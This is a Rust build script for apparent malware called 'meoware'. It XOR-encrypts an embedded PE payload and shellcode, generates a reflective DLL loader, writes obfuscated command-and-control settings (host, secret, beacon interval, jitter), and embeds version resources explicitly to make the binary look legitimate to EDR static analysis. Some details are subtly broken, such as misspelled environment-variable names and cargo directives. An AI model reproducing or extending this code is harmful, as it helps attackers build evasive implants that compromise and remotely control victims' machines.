#[path = "build_loader.rs"]
mod build_loader;

use std::env;
use std::fs;
use std::path::PathBuf;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    let out_path = PathBuf::from(&out_dir);

    let key = generate_build_key();
    let key_code = format!("const XOR_KEY: [u8; {}] = {:?};", key.len(), key);
    fs::write(out_path.join("xor_key.rs"), key_code).unwrap();

    let pe_data = if let Ok(pe_path) = env::var("PAYLOAD_PE_PATH") {
        fs::read(&pe_path).unwrap_or_default()
    } else {
        let crate_root = PathBuf::from(env::var("CARGO_MANIFEST_DIR").unwrap());
        let dummy_path = crate_root.join("dummy.exe");
        if dummy_path.exists() {
            println!("cargo:rerun-if_changed={}", dummy_path.display());
            fs::read(&dummy_path).unwrap_or_else(|_| generate_ghost_stub())
        } else {
            generate_ghost_stub()
        }
    };

    let encrypted_pe = xor_encrypt(&pe_data, &key);
    fs::write(out_path.join("payload.enc"), &encrypted_pe).unwrap();

    // Shellcode generation
    let shellcode = if let Ok(sc_path) = env::var("PAYLOAD_SHELLCODE_PATH") {
        println!("cargo:warning=Using external shellcode: {}", sc_path);
        fs::read(&sc_path).unwrap_or_default()
    } else {
        // Look for meoware.dll in target/release/
        let dll_path = build_loader::find_meoware_dll();
        if let Some(dll) = dll_path {
            println!("cargo:warning=Found meoware.dll - generating PIC reflective loader shellcode");
            println!("cargo:rerun-if-changed={}", dll.display());
            let dll_bytes = fs::read(&dll).unwrap();
            let sc = build_loader::generate_reflective_shellcode(&dll_bytes, &key);

            // Dump raw PIC stub before encrypted DLL payload for offline disassembly
            let stub_only_len = sc.len() - dll_bytes.len(); // approximate: stub + header
            fs::write(out_path.join("stub_debug.bin"), &sc[..stub_only_len.min(sc.len())]).ok();
            println!("cargo:warning=Stub dumped to {}/stub_debug.bin ({} bytes)", out_dir, stub_only_len.min(sc.len()));
            sc
        } else {
            println!("cargo:warning=meoware.dll not found — using placeholder shellcode");
            println!("cargo:warning=Run: cargo build --release --lib -p meoware");
            println!("cargo:warning=Then: cargo build --release --bin meoware");
            // Minimal stub: xor eax,eax; ret (does nothing only returns 0)
            vec![0x31, 0xC0, 0xC3]
        }
    };
    let encrypted_sc = xor_encrypt(&shellcode, &key);
    fs::write(out_path.join("shellcode.enc"), &encrypted_sc).unwrap();

    // C2 Configuration
    let c2_host = env::var("C2_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
    let c2_port: u16 = env::var("C2_PORT").ok().and_then(|s| s.parse().ok()).unwrap_or(8443);
    let c2_https: bool = env::var("C2_HTTPS").map(|s| s == "true").unwrap_or(false);
    let c2_secret = env::var("C2_SECRET").unwrap_or_else(|_| "super-secret-key".to_string());
    let c2_interval: u64 = env::var("C2_INTERVAL").ok().and_then(|s| s.parse().ok()).unwrap_or(60000); // 60 second
    let c2_jitter: u8 = env::var("C2_JITTER").ok().and_then(|s| s.parse().ok()).unwrap_or(20);

    // Generate UTF-16 host array
    let host_u16: Vec<String> = c2_host.encode_utf16()
        .chain(core::iter::once(0u16)) // null terminator
        .map(|c| format!("0x{:04X}", c)).collect();
    let host_len = host_u16.len();
    let host_array = host_u16.join(", ");

    // XOR encrypt the secret with the build key
    let secret_enc = xor_encrypt(c2_secret.as_bytes(), &key);
    let secret_arr: Vec<String> = secret_enc.iter().map(|b| format!("0x{:04X}", b)).collect();
    let secret_len = secret_arr.len();
    let secret_array = secret_arr.join(", ");

    let c2_config = format!(r#"
        const C2_HOST: [u16; {host_len}] = [{host_array}];
        const C2_PORT: u16 = {c2_port};
        const C2_HTTPS: bool = {c2_https};
        const C2_SECRET_ENC: [u8; {secret_len}] = [{secret_array}];
        const C2_INTERVAL: u64 = {c2_interval};
        const C2_JITTER: u8 = {c2_jitter};
    "#);
    fs::write(out_path.join("c2.config.rs"), c2_config).unwrap();

    // Make the PE look legitimate to EDR static analysis
    let crate_dir = PathBuf::from(env::var("CARGO_MAINFEST_DIR").unwrap());
    let rc_file = crate_dir.join("meoware.rc");
    let mainfest_file = crate_dir.join("meoware.mainfest");
    if rc_file.exists() && mainfest_file.exists() {
        // using embed resource approach: compile .rc -> res -> link
        let res_path = out_path.join("meoware.res");

        // Try to find rc.exe in WindwosSDK
        let rc_exe = find_rc_compiler();
        if let Some(rc_path) = rc_exe {
            let status = std::process::Command::new(&rc_path)
                .current_dir(&crate_dir)
                .arg("nologo")
                .arg("/fo")
                .arg(res_path.to_str().unwrap())
                .arg(rc_file.to_str().unwrap())
                .status();

            if let Ok(s) = status {
                if s.success() {
                    println!("cargo:rustc-link-arg-bins={}", res_path.display());
                    println!("cargo:warning=Embedded version info + manifest resource");
                } else {
                    println!("cargo:warning=RC compiler failed - building without version info");
                }
            }
        }
    }

    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-env-changed=PAYLOAD_PE_PATH");
    println!("cargo:rerun-if-env-changed=PAYLOAD_SHELLCODE_PATH");
    println!("cargo:rerun-if-env-changed=C2_HOST");
    println!("cargo:rerun-if-env-changed=C2_PORT");
    println!("cargo:rerun-if-env-changed=C2_HTTPS");
    println!("cargo:rerun-if-env-changed=C2_SECRET");
    println!("cargo:rerun-if-env-changed=C2_INTERVAL");
    println!("cargo:rerun-if-env-changed=C2_JITTER");
}

fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect()
}

fn find_rc_compiler() -> Option<PathBuf> {
    // Common WindwosSDK paths
    let sdk_roots = [
        r"C:\Program Files (x86)\Windows Kits\10\bin",
        r"C:\Program Files\Windows Kits\10\bin",
    ];

    for root in &sdk_roots {
        let root_path = PathBuf::from(root);
        if !root_path.exists() { continue }
        // find latest version directory
        if let Ok(entries) = fs::read_dir(&root_path) {
            let mut versions: Vec<_> = entries.filter_map(|e| e.ok())
                .filter(|e| e.file_type().map(|t| t.is_dir()).unwrap_or(false))
                .filter(|e| {
                    let name = e.file_name();
                    let s = name.to_string_lossy();
                    s.starts_with("10.")
                }).collect();
            versions.sort_by(|a, b| b.file_name().cmp(&a.file_name()));

            for version in versions {
                let rc = version.path().join("x64").join("rc.exe");
                if rc.exists() {
                    return Some(rc);
                }
            }
        }
    }
    None
}

fn generate_build_key() -> Vec<u8> {
    use std::time::SystemTime;
    let seed = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap_or_default().as_nanos();

    let mut key = Vec::with_capacity(32);
    let mut state = seed;
    for _ in 0..32 {
        state = state.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        key.push((state >> 33) as u8);
    }

    key
}


fn generate_ghost_stub() -> Vec<u8> {
    let mut pe = vec![0u8; 0x400];

    // DOS Header (0x000x3F)
    w16(&mut pe, 0x00, 0x5A4D);             // e_magic = "MZ"
    w32(&mut pe, 0x3C, 0x80);               // e_lfanew -> PE header

    // PE Signature (0x80)
    w32(&mut pe, 0x80, 0x00004550);         // "PE\0\0"

    // COFF File Header (0x84, 20 bytes)
    w16(&mut pe, 0x84, 0x8664);             // Machine = AMD64
    w16(&mut pe, 0x86, 1);                  // NumberOfSections
    w32(&mut pe, 0x88, 0x6A6D3700);         // TimeDateStamp (August 1, 2026)
    w16(&mut pe, 0x94, 0xF0);               // SizeOfOptionalHeader = 240
    w16(&mut pe, 0x96, 0x0022);             // EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE

    // Optional Header PE32+ (0x98, 240 bytes)
    w16(&mut pe, 0x98, 0x020B);             // Magic = PE32+
    pe[0x9A] = 14; pe[0x9B] = 36;           // LinkerVersion 14.36 (MSVC-like)
    w32(&mut pe, 0x9C, 0x200);              // SizeOfCode
    w32(&mut pe, 0xA0, 0x200);              // SizeOfInitializedData
    w32(&mut pe, 0xA8, 0x1000);             // AddressOfEntryPoint
    w32(&mut pe, 0xAC, 0x1000);             // BaseOfCode
    w64(&mut pe, 0xB0, 0x0000000140000000); // ImageBase
    w32(&mut pe, 0xB8, 0x1000);             // SectionAlignment
    w32(&mut pe, 0xBC, 0x0200);             // FileAlignment
    w16(&mut pe, 0xC0, 6);                  // MajorOperatingSystemVersion
    w16(&mut pe, 0xC8, 6);                  // MajorSubsystemVersion
    w32(&mut pe, 0xD0, 0x2000);             // SizeOfImage
    w32(&mut pe, 0xD4, 0x0200);             // SizeOfHeaders
    w16(&mut pe, 0xDC, 3);                  // Subsystem = IMAGE_SUBSYSTEM_WINDOWS_CUI
    w16(&mut pe, 0xDE, 0x8160);             // DYNAMIC_BASE|NX_COMPAT|TSA|HIGH_ENTROPY_VA
    w64(&mut pe, 0xE0, 0x00100000);         // SizeOfStackReserve
    w64(&mut pe, 0xE8, 0x1000);             // SizeOfStackCommit
    w64(&mut pe, 0xF0, 0x00100000);         // SizeOfHeapReserve
    w64(&mut pe, 0xF8, 0x1000);             // SizeOfHeapCommit
    w32(&mut pe, 0x104, 16);                // NumberOfRvaAndSizes

    // DataDirectory[1] = Import Directory  (offset 0x108 + 1*8 = 0x110)
    w32(&mut pe, 0x110, 0x1020);            // VirtualAddress
    w32(&mut pe, 0x114, 40);                // Size (1 entry + null)

    // DataDirectory[12] = IAT              (offset 0x108 + 12*8 = 0x168)
    w32(&mut pe, 0x168, 0x1060);            // VirtualAddress
    w32(&mut pe, 0x16C, 16);                // Size

    // Section Header: .text (0x188, 40 bytes)
    pe[0x188..0x190].copy_from_slice(b".text\0\0\0");
    w32(&mut pe, 0x190, 0xA0);             // VirtualSize
    w32(&mut pe, 0x194, 0x1000);           // VirtualAddress
    w32(&mut pe, 0x198, 0x0200);           // SizeOfRawData
    w32(&mut pe, 0x19C, 0x0200);           // PointerToRawData
    w32(&mut pe, 0x1AC, 0x6000_0020);      // CODE | EXECUTE | READ

    // .text section data (file 0x200, RVA 0x1000)
    //
    // Entry point at RVA 0x1000:
    //   sub  rsp, 0x28              ; shadow space + alignment
    //   .loop:
    //   mov  ecx, 0xFFFFFFFF        ; INFINITE
    //   call [rip + 0x51]           ; IAT[0] -> Sleep
    //   jmp  .loop
    //
    // RIP after call = 0x100F, IAT at 0x1060 -> disp = 0x51
    pe[0x200..0x211].copy_from_slice(&[
        0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
        0xB9, 0xFF, 0xFF, 0xFF, 0xFF,       // mov ecx, -1
        0xFF, 0x15, 0x51, 0x00, 0x00, 0x00, // call [rip+0x51]
        0xEB, 0xF3,                         // jmp .loop
    ]);

    // Import Directory Table at RVA 0x1020 (file 0x220)
    // Entry 0 (20 bytes):
    //   OriginalFirstThunk -> ILT at 0x1070
    //   TimeDateStamp      = 0
    //   ForwarderChain     = 0
    //   Name               -> "kernel32.dll" at 0x1080
    //   FirstThunk         -> IAT at 0x1060
    w32(&mut pe, 0x220, 0x1070);           // OriginalFirstThunk
    w32(&mut pe, 0x22C, 0x1080);           // Name
    w32(&mut pe, 0x230, 0x1060);           // FirstThunk
    // Entry 1: null terminator

    // IAT at RVA 0x1060 (file 0x260): points to Hint/Name
    w64(&mut pe, 0x260, 0x1090);

    // ILT at RVA 0x1070 (file 0x270): same target
    w64(&mut pe, 0x270, 0x1090);

    // DLL name at RVA 0x1080 (file 0x280)
    pe[0x280..0x28D].copy_from_slice(b"kernel32.dll\0");

    // Hint/Name at RVA 0x1090 (file 0x290): Hint=0, Name="Sleep"
    // Hint is 2 bytes at 0x290
    pe[0x292..0x298].copy_from_slice(b"Sleep\0");

    pe
}

fn w16(buf: &mut [u8], off: usize, v: u16) {
    buf[off..off + 2].copy_from_slice(&v.to_le_bytes());
}
fn w32(buf: &mut [u8], off: usize, v: u32) {
    buf[off..off + 4].copy_from_slice(&v.to_le_bytes());
}
fn w64(buf: &mut [u8], off: usize, v: u64) {
    buf[off..off + 8].copy_from_slice(&v.to_le_bytes());
}
